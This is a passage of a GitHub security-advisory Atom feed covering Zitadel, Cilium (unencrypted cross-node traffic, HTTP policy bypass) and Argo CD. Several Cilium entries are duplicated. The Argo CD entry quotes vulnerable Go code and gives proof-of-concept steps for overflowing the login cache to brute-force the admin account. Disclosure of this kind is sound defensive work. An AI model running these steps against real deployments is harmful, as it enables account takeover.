<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Daniel Philipp - owt and Thomas Wickham - synopsis for reporting this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28855">https://nvd.nist.gov/vuln/detail/CVE-2024-28855</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">https://github.com/zitadel/zitadel/releases/tag/v2.41.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">https://github.com/zitadel/zitadel/releases/tag/v2.42.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">https://github.com/zitadel/zitadel/releases/tag/v2.43.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">https://github.com/zitadel/zitadel/releases/tag/v2.44.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">https://github.com/zitadel/zitadel/releases/tag/v2.45.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">https://github.com/zitadel/zitadel/releases/tag/v2.46.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">https://github.com/zitadel/zitadel/releases/tag/v2.47.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:34:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted traffic between nodes when using WireGuard and L7 policies]]></title>
        <id>https://github.com/advisories/GHSA-v6q2-4qr3-5cw6</id>
        <link href="https://github.com/advisories/GHSA-v6q2-4qr3-5cw6"/>
        <updated>2024-03-19T18:31:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In Cilium clusters with WireGuard enabled and traffic matching Layer 7 policies:</p>
<ul>
<li>Traffic that should be WireGuard-encrypted is sent unencrypted between a node's Envoy proxy and pods on other nodes.</li>
<li>Traffic that should be WireGuard-encrypted is sent unencrypted between a node's DNS proxy and pods on other nodes.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This issue affects:</p>
<ul>
<li>In native routing mode (<code>routingMode=native</code>):<ul>
<li>Cilium v1.14 versions before v1.14.8</li>
<li>Cilium v1.15 versions before v1.15.2</li>
</ul>
</li>
<li>In tunneling mode (<code>routingMode=tunnel</code>):<ul>
<li>Cilium v1.14 versions before v1.14.4</li>
<li>Cilium v1.14.4 if <code>encryption.wireguard.encapsulate</code> is set to <code>false</code> (default).</li>
</ul>
</li>
</ul>
<p>This issue has been resolved in:</p>
<ul>
<li>In native routing mode (<code>routingMode=native</code>):<ul>
<li>Cilium v1.14.8</li>
<li>Cilium v1.15.2</li>
</ul>
</li>
<li>In tunneling mode (<code>routingMode=tunnel</code>):<ul>
<li>Cilium v1.14.4. <strong>NOTE</strong> <code>encryption.wireguard.encapsulate</code> must be set to <code>true</code>.</li>
</ul>
</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @brb, @giorio94, @gandro and @jschwinger233 for their work on triaging and remediating this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-v6q2-4qr3-5cw6">https://github.com/cilium/cilium/security/advisories/GHSA-v6q2-4qr3-5cw6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28250">https://nvd.nist.gov/vuln/detail/CVE-2024-28250</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.13.13">https://github.com/cilium/cilium/releases/tag/v1.13.13</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.8">https://github.com/cilium/cilium/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.15.2">https://github.com/cilium/cilium/releases/tag/v1.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-v6q2-4qr3-5cw6">https://github.com/advisories/GHSA-v6q2-4qr3-5cw6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v6q2-4qr3-5cw6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:33:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted traffic between nodes when using WireGuard and L7 policies]]></title>
        <id>https://github.com/advisories/GHSA-v6q2-4qr3-5cw6</id>
        <link href="https://github.com/advisories/GHSA-v6q2-4qr3-5cw6"/>
        <updated>2024-03-19T18:31:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In Cilium clusters with WireGuard enabled and traffic matching Layer 7 policies:</p>
<ul>
<li>Traffic that should be WireGuard-encrypted is sent unencrypted between a node's Envoy proxy and pods on other nodes.</li>
<li>Traffic that should be WireGuard-encrypted is sent unencrypted between a node's DNS proxy and pods on other nodes.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This issue affects:</p>
<ul>
<li>In native routing mode (<code>routingMode=native</code>):<ul>
<li>Cilium v1.14 versions before v1.14.8</li>
<li>Cilium v1.15 versions before v1.15.2</li>
</ul>
</li>
<li>In tunneling mode (<code>routingMode=tunnel</code>):<ul>
<li>Cilium v1.14 versions before v1.14.4</li>
<li>Cilium v1.14.4 if <code>encryption.wireguard.encapsulate</code> is set to <code>false</code> (default).</li>
</ul>
</li>
</ul>
<p>This issue has been resolved in:</p>
<ul>
<li>In native routing mode (<code>routingMode=native</code>):<ul>
<li>Cilium v1.14.8</li>
<li>Cilium v1.15.2</li>
</ul>
</li>
<li>In tunneling mode (<code>routingMode=tunnel</code>):<ul>
<li>Cilium v1.14.4. <strong>NOTE</strong> <code>encryption.wireguard.encapsulate</code> must be set to <code>true</code>.</li>
</ul>
</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @brb, @giorio94, @gandro and @jschwinger233 for their work on triaging and remediating this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-v6q2-4qr3-5cw6">https://github.com/cilium/cilium/security/advisories/GHSA-v6q2-4qr3-5cw6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28250">https://nvd.nist.gov/vuln/detail/CVE-2024-28250</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.13.13">https://github.com/cilium/cilium/releases/tag/v1.13.13</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.8">https://github.com/cilium/cilium/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.15.2">https://github.com/cilium/cilium/releases/tag/v1.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-v6q2-4qr3-5cw6">https://github.com/advisories/GHSA-v6q2-4qr3-5cw6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v6q2-4qr3-5cw6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:33:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted traffic between nodes when using IPsec and L7 policies]]></title>
        <id>https://github.com/advisories/GHSA-j89h-qrvr-xc36</id>
        <link href="https://github.com/advisories/GHSA-j89h-qrvr-xc36"/>
        <updated>2024-03-19T18:31:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In Cilium clusters with IPsec enabled and traffic matching Layer 7 policies:</p>
<ul>
<li>Traffic that should be IPsec-encrypted between a node's Envoy proxy and pods on other nodes is sent unencrypted</li>
<li>Traffic that should be IPsec-encrypted between a node's DNS proxy and pods on other nodes is sent unencrypted</li>
</ul>
<p><strong>Note:</strong> For clusters running in native routing mode, IPsec encryption is not applied to connections which are selected by a L7 Egress Network Policy or a DNS Policy. This is a known limitation of Cilium's IPsec encryption which will continue to apply after upgrading to the latest Cilium versions described below.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects: </p>
<ul>
<li>Cilium v1.15 before v1.15.2</li>
<li>Cilium v1.14 before v1.14.8</li>
<li>Cilium v1.13 before v1.13.13</li>
<li>Cilium v1.4 to v1.12 inclusive</li>
</ul>
<p>This issue has been resolved in:</p>
<ul>
<li>Cilium v1.15.2</li>
<li>Cilium v1.14.8</li>
<li>Cilium v1.13.13</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @jschwinger233, @julianwiedmann, @giorio94, and @jrajahalme for their work in triaging and resolving this issue.   </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability in Cilium, we strongly encourage you to report it to our private security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list that only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-j89h-qrvr-xc36">https://github.com/cilium/cilium/security/advisories/GHSA-j89h-qrvr-xc36</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28249">https://nvd.nist.gov/vuln/detail/CVE-2024-28249</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.13.13">https://github.com/cilium/cilium/releases/tag/v1.13.13</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.8">https://github.com/cilium/cilium/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.15.2">https://github.com/cilium/cilium/releases/tag/v1.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-j89h-qrvr-xc36">https://github.com/advisories/GHSA-j89h-qrvr-xc36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j89h-qrvr-xc36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted traffic between nodes when using IPsec and L7 policies]]></title>
        <id>https://github.com/advisories/GHSA-j89h-qrvr-xc36</id>
        <link href="https://github.com/advisories/GHSA-j89h-qrvr-xc36"/>
        <updated>2024-03-19T18:31:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In Cilium clusters with IPsec enabled and traffic matching Layer 7 policies:</p>
<ul>
<li>Traffic that should be IPsec-encrypted between a node's Envoy proxy and pods on other nodes is sent unencrypted</li>
<li>Traffic that should be IPsec-encrypted between a node's DNS proxy and pods on other nodes is sent unencrypted</li>
</ul>
<p><strong>Note:</strong> For clusters running in native routing mode, IPsec encryption is not applied to connections which are selected by a L7 Egress Network Policy or a DNS Policy. This is a known limitation of Cilium's IPsec encryption which will continue to apply after upgrading to the latest Cilium versions described below.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects: </p>
<ul>
<li>Cilium v1.15 before v1.15.2</li>
<li>Cilium v1.14 before v1.14.8</li>
<li>Cilium v1.13 before v1.13.13</li>
<li>Cilium v1.4 to v1.12 inclusive</li>
</ul>
<p>This issue has been resolved in:</p>
<ul>
<li>Cilium v1.15.2</li>
<li>Cilium v1.14.8</li>
<li>Cilium v1.13.13</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @jschwinger233, @julianwiedmann, @giorio94, and @jrajahalme for their work in triaging and resolving this issue.   </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability in Cilium, we strongly encourage you to report it to our private security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list that only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-j89h-qrvr-xc36">https://github.com/cilium/cilium/security/advisories/GHSA-j89h-qrvr-xc36</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28249">https://nvd.nist.gov/vuln/detail/CVE-2024-28249</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.13.13">https://github.com/cilium/cilium/releases/tag/v1.13.13</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.8">https://github.com/cilium/cilium/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.15.2">https://github.com/cilium/cilium/releases/tag/v1.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-j89h-qrvr-xc36">https://github.com/advisories/GHSA-j89h-qrvr-xc36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j89h-qrvr-xc36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted traffic between nodes when using IPsec and L7 policies]]></title>
        <id>https://github.com/advisories/GHSA-j89h-qrvr-xc36</id>
        <link href="https://github.com/advisories/GHSA-j89h-qrvr-xc36"/>
        <updated>2024-03-19T18:31:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In Cilium clusters with IPsec enabled and traffic matching Layer 7 policies:</p>
<ul>
<li>Traffic that should be IPsec-encrypted between a node's Envoy proxy and pods on other nodes is sent unencrypted</li>
<li>Traffic that should be IPsec-encrypted between a node's DNS proxy and pods on other nodes is sent unencrypted</li>
</ul>
<p><strong>Note:</strong> For clusters running in native routing mode, IPsec encryption is not applied to connections which are selected by a L7 Egress Network Policy or a DNS Policy. This is a known limitation of Cilium's IPsec encryption which will continue to apply after upgrading to the latest Cilium versions described below.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects: </p>
<ul>
<li>Cilium v1.15 before v1.15.2</li>
<li>Cilium v1.14 before v1.14.8</li>
<li>Cilium v1.13 before v1.13.13</li>
<li>Cilium v1.4 to v1.12 inclusive</li>
</ul>
<p>This issue has been resolved in:</p>
<ul>
<li>Cilium v1.15.2</li>
<li>Cilium v1.14.8</li>
<li>Cilium v1.13.13</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @jschwinger233, @julianwiedmann, @giorio94, and @jrajahalme for their work in triaging and resolving this issue.   </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability in Cilium, we strongly encourage you to report it to our private security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list that only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-j89h-qrvr-xc36">https://github.com/cilium/cilium/security/advisories/GHSA-j89h-qrvr-xc36</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28249">https://nvd.nist.gov/vuln/detail/CVE-2024-28249</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.13.13">https://github.com/cilium/cilium/releases/tag/v1.13.13</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.8">https://github.com/cilium/cilium/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.15.2">https://github.com/cilium/cilium/releases/tag/v1.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-j89h-qrvr-xc36">https://github.com/advisories/GHSA-j89h-qrvr-xc36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j89h-qrvr-xc36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-18T20:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Intermittent HTTP policy bypass]]></title>
        <id>https://github.com/advisories/GHSA-68mj-9pjq-mc85</id>
        <link href="https://github.com/advisories/GHSA-68mj-9pjq-mc85"/>
        <updated>2024-03-19T18:31:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Cilium's <a href="https://docs.cilium.io/en/stable/security/policy/language/#http">HTTP policies</a> are not consistently applied to all traffic in the scope of the policies, leading to HTTP traffic being incorrectly and intermittently forwarded when it should be dropped.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.13 between v1.13.9 and v1.13.12 inclusive</li>
<li>Cilium v1.14 between v1.14.0 and v1.14.7 inclusive</li>
<li>Cilium v1.15.0 and v1.15.1</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.15.2</li>
<li>Cilium v1.14.8</li>
<li>Cilium v1.13.13</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue – affected users are strongly encouraged to upgrade.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @romikps for discovering and reporting this issue, and @sayboras and @jrajahalme for preparing the fix.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium internal security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-68mj-9pjq-mc85">https://github.com/cilium/cilium/security/advisories/GHSA-68mj-9pjq-mc85</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28248">https://nvd.nist.gov/vuln/detail/CVE-2024-28248</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/policy/language/#http">https://docs.cilium.io/en/stable/security/policy/language/#http</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.13.13">https://github.com/cilium/cilium/releases/tag/v1.13.13</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.8">https://github.com/cilium/cilium/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.15.2">https://github.com/cilium/cilium/releases/tag/v1.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-68mj-9pjq-mc85">https://github.com/advisories/GHSA-68mj-9pjq-mc85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68mj-9pjq-mc85</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:30:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Intermittent HTTP policy bypass]]></title>
        <id>https://github.com/advisories/GHSA-68mj-9pjq-mc85</id>
        <link href="https://github.com/advisories/GHSA-68mj-9pjq-mc85"/>
        <updated>2024-03-19T18:31:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Cilium's <a href="https://docs.cilium.io/en/stable/security/policy/language/#http">HTTP policies</a> are not consistently applied to all traffic in the scope of the policies, leading to HTTP traffic being incorrectly and intermittently forwarded when it should be dropped.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.13 between v1.13.9 and v1.13.12 inclusive</li>
<li>Cilium v1.14 between v1.14.0 and v1.14.7 inclusive</li>
<li>Cilium v1.15.0 and v1.15.1</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.15.2</li>
<li>Cilium v1.14.8</li>
<li>Cilium v1.13.13</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue – affected users are strongly encouraged to upgrade.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @romikps for discovering and reporting this issue, and @sayboras and @jrajahalme for preparing the fix.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium internal security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-68mj-9pjq-mc85">https://github.com/cilium/cilium/security/advisories/GHSA-68mj-9pjq-mc85</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28248">https://nvd.nist.gov/vuln/detail/CVE-2024-28248</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/policy/language/#http">https://docs.cilium.io/en/stable/security/policy/language/#http</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.13.13">https://github.com/cilium/cilium/releases/tag/v1.13.13</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.8">https://github.com/cilium/cilium/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.15.2">https://github.com/cilium/cilium/releases/tag/v1.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-68mj-9pjq-mc85">https://github.com/advisories/GHSA-68mj-9pjq-mc85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68mj-9pjq-mc85</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:30:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Intermittent HTTP policy bypass]]></title>
        <id>https://github.com/advisories/GHSA-68mj-9pjq-mc85</id>
        <link href="https://github.com/advisories/GHSA-68mj-9pjq-mc85"/>
        <updated>2024-03-19T18:31:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Cilium's <a href="https://docs.cilium.io/en/stable/security/policy/language/#http">HTTP policies</a> are not consistently applied to all traffic in the scope of the policies, leading to HTTP traffic being incorrectly and intermittently forwarded when it should be dropped.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.13 between v1.13.9 and v1.13.12 inclusive</li>
<li>Cilium v1.14 between v1.14.0 and v1.14.7 inclusive</li>
<li>Cilium v1.15.0 and v1.15.1</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.15.2</li>
<li>Cilium v1.14.8</li>
<li>Cilium v1.13.13</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue – affected users are strongly encouraged to upgrade.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @romikps for discovering and reporting this issue, and @sayboras and @jrajahalme for preparing the fix.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium internal security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-68mj-9pjq-mc85">https://github.com/cilium/cilium/security/advisories/GHSA-68mj-9pjq-mc85</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28248">https://nvd.nist.gov/vuln/detail/CVE-2024-28248</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/policy/language/#http">https://docs.cilium.io/en/stable/security/policy/language/#http</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.13.13">https://github.com/cilium/cilium/releases/tag/v1.13.13</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.14.8">https://github.com/cilium/cilium/releases/tag/v1.14.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.15.2">https://github.com/cilium/cilium/releases/tag/v1.15.2</a></li>
<li><a href="https://github.com/advisories/GHSA-68mj-9pjq-mc85">https://github.com/advisories/GHSA-68mj-9pjq-mc85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68mj-9pjq-mc85</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:30:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow]]></title>
        <id>https://github.com/advisories/GHSA-2vgg-9h6w-m454</id>
        <link href="https://github.com/advisories/GHSA-2vgg-9h6w-m454"/>
        <updated>2024-03-18T21:46:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">patched CVE</a> intended to protect against brute-force attacks.</p>
<h3 id="details">Details</h3>
<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>
<p>The brute force protection mechanism's code:</p>
<pre><code class="language-go">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {
       log.Warnf("Session cache size exceeds %d entries, removing random entry",

getMaximumCacheSize())
       idx := rand.Intn(len(failures) - 1)
       var rmUser string
       i := 0
       for key := range failures {

           if i == idx {
               rmUser = key

               delete(failures, key)

break

}

i++ }

       log.Infof("Deleted entry for user %s from cache", rmUser)
   }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Set up the application environment and identify the login page.</li>
<li>Execute 4 failed login attempts for the admin account.</li>
<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>
<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>
<li>At this point, brute-force the admin account.</li>
</ol>
<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href="https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force">older CVE</a> rate limit patches useless.</p>
<h3 id="impact">Impact</h3>
<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21662">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>
